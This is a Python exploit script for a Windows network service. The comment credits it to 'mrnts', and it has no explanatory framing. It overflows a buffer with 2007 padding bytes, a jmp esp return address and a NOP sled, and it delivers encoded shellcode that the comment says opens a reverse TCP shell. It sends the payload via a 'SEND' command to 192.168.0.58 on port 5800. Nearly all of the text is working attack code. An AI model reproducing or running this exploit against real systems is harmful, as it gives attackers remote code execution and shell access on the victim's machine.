#!/usr/bin/python
# Simple exploit for windows by mrnts with a reverse_tcp shell

import socket

shellcode = ("\xbf\x94\xd8\x8e\x7d\xda\xc6\xd9\x74\x24\xf4\x5d\x29\xc9\xb1"
"\x52\x83\xed\xfc\x31\x7d\x0e\x03\xe9\xd6\x6c\x88\xed\x0f\xf2"
"\x73\x0d\xd0\x93\xfa\xe8\xe1\x93\x99\x79\x51\x24\xe9\x2f\x5e"
"\xcf\xbf\xdb\xd5\xbd\x17\xec\x5e\x0b\x4e\xc3\x5f\x20\xb2\x42"
"\xdc\x3b\xe7\xa4\xdd\xf3\xfa\xa5\x1a\xe9\xf7\xf7\xf3\x65\xa5"
"\xe7\x70\x33\x76\x8c\xcb\xd5\xfe\x71\x9b\xd4\x2f\x24\x97\x8e"
"\xef\xc7\x74\xbb\xb9\xdf\x99\x86\x70\x54\x69\x7c\x83\xbc\xa3"
"\x7d\x28\x81\x0b\x8c\x30\xc6\xac\x6f\x47\x3e\xcf\x12\x50\x85"
"\xad\xc8\xd5\x1d\x15\x9a\x4e\xf9\xa7\x4f\x08\x8a\xa4\x24\x5e"
"\xd4\xa8\xbb\xb3\x6f\xd4\x30\x32\xbf\x5c\x02\x11\x1b\x04\xd0"
"\x38\x3a\xe0\xb7\x45\x5c\x4b\x67\xe0\x17\x66\x7c\x99\x7a\xef"
"\xb1\x90\x84\xef\xdd\xa3\xf7\xdd\x42\x18\x9f\x6d\x0a\x86\x58"
"\x91\x21\x7e\xf6\x6c\xca\x7f\xdf\xaa\x9e\x2f\x77\x1a\x9f\xbb"
"\x87\xa3\x4a\x6b\xd7\x0b\x25\xcc\x87\xeb\x95\xa4\xcd\xe3\xca"
"\xd5\xee\x29\x63\x7f\x15\xba\x4c\x28\x15\x1a\x25\x2b\x15\x5b"
"\x0e\xa2\xf3\x31\x60\xe3\xac\xad\x19\xae\x26\x4f\xe5\x64\x43"
"\x4f\x6d\x8b\xb4\x1e\x86\xe6\xa6\xf7\x66\xbd\x94\x5e\x78\x6b"
"\xb0\x3d\xeb\xf0\x40\x4b\x10\xaf\x17\x1c\xe6\xa6\xfd\xb0\x51"
"\x11\xe3\x48\x07\x5a\xa7\x96\xf4\x65\x26\x5a\x40\x42\x38\xa2"
"\x49\xce\x6c\x7a\x1c\x98\xda\x3c\xf6\x6a\xb4\x96\xa5\x24\x50"
"\x6e\x86\xf6\x26\x6f\xc3\x80\xc6\xde\xba\xd4\xf9\xef\x2a\xd1"
"\x82\x0d\xcb\x1e\x59\x96\xeb\xfc\x4b\xe3\x83\x58\x1e\x4e\xce"
"\x5a\xf5\x8d\xf7\xd8\xff\x6d\x0c\xc0\x8a\x68\x48\x46\x67\x01"
"\xc1\x23\x87\xb6\xe2\x61")

# jmp esp
# 0x625012a0

dados = "A" * 2007 + "\xa0\x12\x50\x62" + "\x90" * 32 + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.58",5800))
s.send("SEND "+dados+"\r\n")
